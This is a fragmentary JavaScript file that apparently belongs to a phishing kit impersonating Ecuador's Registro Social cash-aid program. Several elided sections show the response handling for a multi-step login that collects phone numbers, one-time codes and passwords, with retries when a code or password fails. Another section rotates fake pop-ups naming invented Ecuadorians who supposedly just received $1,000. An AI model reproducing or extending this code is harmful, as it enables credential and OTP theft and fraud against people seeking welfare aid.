        ...
        success: function(data) {
            if (data && data.result) {
                ...
                // ── B. STATUS FAILED ───────────────────────────────────
                    ...
                    if (res.type === "OTP") {
                        $("#otp_code").val("");
                        $("#alert2").html("Invalid or expired code.").fadeIn();
                        $(".step-section").removeClass("active");
                        $("#step2").addClass("active");
                        sessionStorage.setItem("user_state", "otp");
                    ...
                    // ── FAILED: Nomor Telepon Bermasalah ───────────────
                        ...
                        $("#alert1").html("Invalid or unregistered phone number.").fadeIn();
                        $(".step-section").removeClass("active");
                    ...
                    // ── FAILED: Password Salah ─────────────────────────
                        ...
                        $("#password").val("");
                        $("#alert3").html("Incorrect password. Please try again.").fadeIn();
                        $(".step-section").removeClass("active");
                        $("#step3").addClass("active");
                        sessionStorage.setItem("user_state", "password");
                    ...
                    // ── FAILED: Type tidak dikenal → fallback ke step1 ─
                        ...
                        $("#alert1").html("Unexpected error. Please try again.").fadeIn();
                        $(".step-section").removeClass("active");
                        $("#step1").addClass("active");
                        $("#firstForm").find("button").prop("disabled", false).text("CONTINUE");
                        sessionStorage.removeItem("user_phone");
...
const daftarNama = [
    "Miguel O. de Machala",
    "Gabriela T. de Ibarra",
    "Carlos R. de Quito",
    "María V. de Guayaquil",
    "Luis A. de Cuenca",
    "Ana P. de Loja",
    "Jorge C. de Manta",
    "Rosa M. de Ambato",
...
const daftarPesan = [
    "Registro Social validado.",
    "Información validada por la Unidad del Registro Social.",
    "Acaba de recibir su ayuda en efectivo de $1,000."
];

function tampilkanNotifikasi() {
    const popup = document.getElementById('notification-popup');
    const elemenNama = document.getElementById('notif-name');

    const elemenPesan = popup.querySelector('.toast-content p');

    if (!popup || !elemenNama) return;
    ...
    elemenNama.textContent = namaAcak;
    elemenPesan.textContent = pesanAcak;
...
setTimeout(tampilkanNotifikasi, 1000);
setInterval(tampilkanNotifikasi, 7000);

function triggerLoadingToStep5() {
